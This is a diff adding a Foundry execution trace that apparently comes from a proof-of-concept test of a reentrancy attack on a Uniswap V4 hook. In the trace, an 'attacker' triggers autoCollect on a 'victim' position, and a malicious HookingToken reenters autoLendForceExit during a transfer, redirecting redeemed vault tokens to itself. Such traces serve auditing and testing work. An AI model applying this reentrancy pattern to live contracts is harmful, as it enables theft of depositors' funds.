@@ -1,0 +1,101 @@
+    ├─ [222391] 0x4444000000000000000000000000000000001Fc3::autoCollect([2])
+    │   ├─ [221015] RevertHookPositionActions::autoCollect([2]) [delegatecall]
+    │   │   ├─ [899] V4PositionManager::ownerOf(2) [staticcall]
+    │   │   │   └─ ← [Return] victim: [0x131f15F1fD1024551542390614B6c7e210A911AF]
+    │   │   ├─ [217846] V4PoolManager::unlock(0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000009df0c6b0066d5317aa5b38b36850548dacca6b4e)
+    │   │   │   ├─ [215887] 0x4444000000000000000000000000000000001Fc3::unlockCallback(0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000009df0c6b0066d5317aa5b38b36850548dacca6b4e)
+    │   │   │   │   ├─ [214087] RevertHookPositionActions::executeAutoCollect(2, attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
+    │   │   │   │   │   ├─ [1938] V4PositionManager::getPoolAndPositionInfo(2) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] PoolKey({ currency0: 0xc7183455a4C133Ae270771860664b6B7ec320bB1, currency1: 0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF, fee: 10000 [1e4], tickSpacing: 200, hooks: 0x4444000000000000000000000000000000001Fc3 }), 111562264816817597832900346768489103093737608351722734598205615418778174044160 [1.115e77]
+    │   │   │   │   │   ├─ [192295] RevertHookSwapActions::modifyLiquiditiesWithPair(V4PositionManager: [0xBf7b2e60F266C6B17044D43C4b094611A6a95710], 0x0011, 0x0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffffffffffffffffffffffffffff00000000000000000000000000000000ffffffffffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000000, SimpleToken: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], HookingToken: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF], 0) [delegatecall]
+    │   │   │   │   │   │   ├─ [188550] V4PositionManager::modifyLiquiditiesWithoutUnlock(0x0011, [0x0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffffffffffffffffffffffffffff00000000000000000000000000000000ffffffffffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000000, 0x000000000000000000000000c7183455a4c133ae270771860664b6b7ec320bb1000000000000000000000000d6bbde9174b1cdaa358d2cf4d57d1a9f7178fbff0000000000000000000000004444000000000000000000000000000000001fc3])
+    │   │   │   │   │   │   │   ├─ [71057] V4PoolManager::modifyLiquidity(PoolKey({ currency0: 0xc7183455a4C133Ae270771860664b6B7ec320bB1, currency1: 0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF, fee: 10000 [1e4], tickSpacing: 200, hooks: 0x4444000000000000000000000000000000001Fc3 }), ModifyLiquidityParams({ tickLower: -200, tickUpper: 200, liquidityDelta: 0, salt: 0x0000000000000000000000000000000000000000000000000000000000000002 }), 0x)
+    │   │   │   │   │   │   │   │   ├─ [784] 0x4444000000000000000000000000000000001Fc3::beforeRemoveLiquidity(V4PositionManager: [0xBf7b2e60F266C6B17044D43C4b094611A6a95710], PoolKey({ currency0: 0xc7183455a4C133Ae270771860664b6B7ec320bB1, currency1: 0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF, fee: 10000 [1e4], tickSpacing: 200, hooks: 0x4444000000000000000000000000000000001Fc3 }), ModifyLiquidityParams({ tickLower: -200, tickUpper: 200, liquidityDelta: 0, salt: 0x0000000000000000000000000000000000000000000000000000000000000002 }), 0x)
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x21d0ee70
+    │   │   │   │   │   │   │   │   ├─ emit ModifyLiquidity(id: 0xf6a601146e7c83b38d98b47362cc020ea2aae2378111a97a83e07261694d176d, sender: V4PositionManager: [0xBf7b2e60F266C6B17044D43C4b094611A6a95710], tickLower: -200, tickUpper: 200, liquidityDelta: 0, salt: 0x0000000000000000000000000000000000000000000000000000000000000002)
+    │   │   │   │   │   │   │   │   ├─ [58181] 0x4444000000000000000000000000000000001Fc3::afterRemoveLiquidity(V4PositionManager: [0xBf7b2e60F266C6B17044D43C4b094611A6a95710], PoolKey({ currency0: 0xc7183455a4C133Ae270771860664b6B7ec320bB1, currency1: 0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF, fee: 10000 [1e4], tickSpacing: 200, hooks: 0x4444000000000000000000000000000000001Fc3 }), ModifyLiquidityParams({ tickLower: -200, tickUpper: 200, liquidityDelta: 0, salt: 0x0000000000000000000000000000000000000000000000000000000000000002 }), 24305883351495616588816328586946149235057520439788063012 [2.43e55], 24305883351495616588816328586946149235057520439788063012 [2.43e55], 0x)
+    │   │   │   │   │   │   │   │   │   ├─ [1917] RevertHookAutoLendActions::takeProtocolFees(2, PoolKey({ currency0: 0xc7183455a4C133Ae270771860664b6B7ec320bB1, currency1: 0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF, fee: 10000 [1e4], tickSpacing: 200, hooks: 0x4444000000000000000000000000000000001Fc3 }), 0, 24305883351495616588816328586946149235057520439788063012 [2.43e55], 24305883351495616588816328586946149235057520439788063012 [2.43e55]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   │   │   ├─ [3043] V4PositionManager::getPositionLiquidity(2) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [375] V4PoolManager::extsload(0x6edbf53e39c69f58876487ab4d3dde24d705590136c1db4edde9e8ba4de2e686) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000008ac7230489e80000
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 10000000000000000000 [1e19]
+    │   │   │   │   │   │   │   │   │   ├─ [49333] V4Oracle::getValue(2, 0x0000000000000000000000000000000000000000) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [1938] V4PositionManager::getPoolAndPositionInfo(2) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] PoolKey({ currency0: 0xc7183455a4C133Ae270771860664b6B7ec320bB1, currency1: 0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF, fee: 10000 [1e4], tickSpacing: 200, hooks: 0x4444000000000000000000000000000000001Fc3 }), 111562264816817597832900346768489103093737608351722734598205615418778174044160 [1.115e77]
+    │   │   │   │   │   │   │   │   │   │   ├─ [375] V4PoolManager::extsload(0x982cc72b66de306c0438ce25cdc90c6dcf444aa814342c9799c634eb9542b78e) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000002710000000000085000000000000000101b6f6097c5821c2fc576911
+    │   │   │   │   │   │   │   │   │   │   ├─ [154] PriceFeedStub::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 8
+    │   │   │   │   │   │   │   │   │   │   ├─ [264] PriceFeedStub::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 1, 100000000 [1e8], 1, 1, 1
+    │   │   │   │   │   │   │   │   │   │   ├─ [154] PriceFeedStub::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 8
+    │   │   │   │   │   │   │   │   │   │   ├─ [264] PriceFeedStub::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 1, 100000000 [1e8], 1, 1, 1
+    │   │   │   │   │   │   │   │   │   │   ├─ [233] SimpleToken::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   │   │   │   ├─ [279] HookingToken::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   │   │   │   ├─ [949] V4PoolManager::extsload(0x6edbf53e39c69f58876487ab4d3dde24d705590136c1db4edde9e8ba4de2e686, 3) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] [0x0000000000000000000000000000000000000000000000008ac7230489e80000, 0x000000000000000000000000000000000386c6e7874b85ce19dea6a4f1c2d672, 0x000000000000000000000000000000000387b9e626b86e8bfeb9989e4d5db8a1]
+    │   │   │   │   │   │   │   │   │   │   ├─ [774] V4PoolManager::extsload(0x982cc72b66de306c0438ce25cdc90c6dcf444aa814342c9799c634eb9542b78f, 2) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] [0x0000000000000000000000000000000003fbdb89fa90005be4297c8d89ec053a, 0x0000000000000000000000000000000003f97c0d6bffb8f48d25007575fecce9]
+    │   │   │   │   │   │   │   │   │   │   ├─ [774] V4PoolManager::extsload(0xb4fa018e757e0dd234e2459002a75c487de01924999cb64da4402ab6c261ffa3, 2) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] [0x00000000000000000000000000000000007514a273447a8dca4ad5e898292ec8, 0x000000000000000000000000000000000071c22745474a688e6b67d728a11448]
+    │   │   │   │   │   │   │   │   │   │   ├─ [774] V4PoolManager::extsload(0x26aea46676784fe712068944b81081fba4654f5a8222f848acc6c7adeaaf8a12, 2) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] [0x0000000000000000000000000000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000000000000000000000000000]
+    │   │   │   │   │   │   │   │   │   │   ├─ [375] V4PoolManager::extsload(0x982cc72b66de306c0438ce25cdc90c6dcf444aa814342c9799c634eb9542b78e) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000002710000000000085000000000000000101b6f6097c5821c2fc576911
+    │   │   │   │   │   │   │   │   │   │   ├─ [4827] HookFeeController::quoteProtocolFees(2, 0, 0) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [1842] 0x4444000000000000000000000000000000001Fc3::positionStates(2) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 1, 0, 1, 0x0000000000000000000000000000000000000000, 0, 0, 0x0000000000000000000000000000000000000000, 0
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [592] 0x4444000000000000000000000000000000001Fc3::pendingProtocolFees(2) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0, 0
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0, 0
+    │   │   │   │   │   │   │   │   │   │   ├─ [154] PriceFeedStub::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 8
+    │   │   │   │   │   │   │   │   │   │   ├─ [264] PriceFeedStub::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 1, 100000000 [1e8], 1, 1, 1
+    │   │   │   │   │   │   │   │   │   │   ├─ [154] PriceFeedStub::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 8
+    │   │   │   │   │   │   │   │   │   │   ├─ [264] PriceFeedStub::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 1, 100000000 [1e8], 1, 1, 1
+    │   │   │   │   │   │   │   │   │   │   ├─ [233] SimpleToken::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 198993425175810364 [1.989e17], 0, 79228162514264337593543950336 [7.922e28], 79228162514264337593543950336 [7.922e28]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x6c2bbe7e, 0
+    │   │   │   │   │   │   │   │   └─ ← [Return] 24305883351495616588816328586946149235057520439788063012 [2.43e55], 24305883351495616588816328586946149235057520439788063012 [2.43e55]
+    │   │   │   │   │   │   │   ├─ [859] V4PoolManager::exttload(0x8ce86d013d3d1037dc8d977754e0e42ccb0463896219901d103ff95904d46b9e) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000fdc3e842d04948
+    │   │   │   │   │   │   │   ├─ [22607] V4PoolManager::take(SimpleToken: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], 0x4444000000000000000000000000000000001Fc3, 71428571428571464 [7.142e16])
+    │   │   │   │   │   │   │   │   ├─ [21034] SimpleToken::transfer(0x4444000000000000000000000000000000001Fc3, 71428571428571464 [7.142e16])
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   ├─ [859] V4PoolManager::exttload(0xea143805f8fb0377a453729e049c52e44ee0cdb008c1ec8f3791b7d6171f5388) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000fdc3e842d04924
+    │   │   │   │   │   │   │   ├─ [84979] V4PoolManager::take(HookingToken: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF], 0x4444000000000000000000000000000000001Fc3, 71428571428571428 [7.142e16])
+    │   │   │   │   │   │   │   │   ├─ [83406] HookingToken::transfer(0x4444000000000000000000000000000000001Fc3, 71428571428571428 [7.142e16])
+    │   │   │   │   │   │   │   │   │   ├─ [61230] 0x4444000000000000000000000000000000001Fc3::autoLendForceExit(4)
+    │   │   │   │   │   │   │   │   │   │   ├─ [59935] RevertHookAutoLendActions::autoLendForceExit(4) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [899] V4PositionManager::ownerOf(4) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] HookingToken: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [1938] V4PositionManager::getPoolAndPositionInfo(4) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] PoolKey({ currency0: 0xc7183455a4C133Ae270771860664b6B7ec320bB1, currency1: 0xe8dc788818033232EF9772CB2e6622F1Ec8bc840, fee: 3000, tickSpacing: 60, hooks: 0x4444000000000000000000000000000000001Fc3 }), 96444859333539506501988929854960621040532268148581110241866055527512420662272 [9.644e76]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [1938] V4PositionManager::getPoolAndPositionInfo(4) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] PoolKey({ currency0: 0xc7183455a4C133Ae270771860664b6B7ec320bB1, currency1: 0xe8dc788818033232EF9772CB2e6622F1Ec8bc840, fee: 3000, tickSpacing: 60, hooks: 0x4444000000000000000000000000000000001Fc3 }), 96444859333539506501988929854960621040532268148581110241866055527512420662272 [9.644e76]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [16522] MockERC4626Vault::redeem(14931914022994408 [1.493e16], 0x4444000000000000000000000000000000001Fc3, 0x4444000000000000000000000000000000001Fc3)
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x4444000000000000000000000000000000001Fc3, to: 0x0000000000000000000000000000000000000000, value: 14931914022994408 [1.493e16])
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [3934] SimpleToken::transfer(0x4444000000000000000000000000000000001Fc3, 14931914022994408 [1.493e16])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Withdraw(sender: 0x4444000000000000000000000000000000001Fc3, receiver: 0x4444000000000000000000000000000000001Fc3, owner: 0x4444000000000000000000000000000000001Fc3, assets: 14931914022994408 [1.493e16], shares: 14931914022994408 [1.493e16])
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 14931914022994408 [1.493e16]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ emit SetPositionConfig(tokenId: 4, positionConfig: PositionConfig({ modeFlags: 0, autoCollectMode: 0, autoExitIsRelative: false, autoExitSwapOnLowerTrigger: true, autoExitSwapOnUpperTrigger: true, autoExitTickLower: -8388608 [-8.388e6], autoExitTickUpper: 8388607 [8.388e6], autoRangeLowerLimit: -8388608 [-8.388e6], autoRangeUpperLimit: 8388607 [8.388e6], autoRangeLowerDelta: 0, autoRangeUpperDelta: 0, autoLendToleranceTick: 0, autoLeverageTargetBps: 0 }))
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [530] SimpleToken::balanceOf(0x4444000000000000000000000000000000001Fc3) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 86360485451565872 [8.636e16]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [530] SimpleToken::balanceOf(0x4444000000000000000000000000000000001Fc3) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [1134] SimpleToken::transfer(HookingToken: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF], 86360485451565872 [8.636e16])
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   ├─ emit SendLeftoverTokens(tokenId: 4, currency0: SimpleToken: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], currency1: SimpleToken: [0xe8dc788818033232EF9772CB2e6622F1Ec8bc840], amount0: 86360485451565872 [8.636e16], amount1: 0, recipient: HookingToken: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF])
+    │   │   │   │   │   │   │   │   │   │   │   ├─ emit AutoLendForceExit(tokenId: 4, token: SimpleToken: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], amount: 14931914022994408 [1.493e16], shares: 14931914022994408 [1.493e16])
